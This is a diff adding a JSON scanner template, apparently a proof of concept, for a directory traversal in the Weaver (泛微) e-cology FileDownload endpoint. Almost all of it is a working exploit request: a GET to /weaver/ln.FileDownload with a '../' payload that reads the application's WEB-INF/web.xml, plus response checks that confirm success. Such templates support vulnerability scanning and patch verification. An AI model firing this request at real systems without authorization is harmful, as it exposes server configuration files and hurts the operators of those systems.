@@ -1,0 +1,32 @@
+{
+    "Name": "泛微-filedownload-directory-traversal",
+    "Description": "泛微-filedownload-directory-traversal",
+    "Product": "泛微",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml",
+        "Port":"",
+        "Data":"",
+        "follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+            "Check_Steps":"AND",
+            "Checks": [
+                    {
+                    "Operation": "contains", 
+                    "Key":"",
+                    "Value": "<url-pattern>/weaver/"
+                    },
+                     {
+                    "Operation": "code", 
+                    "Key":"",
+                    "Value": "200"  
+                     }
+            ]
+            },
+            "Next_decide":""
+        }
+    ]}
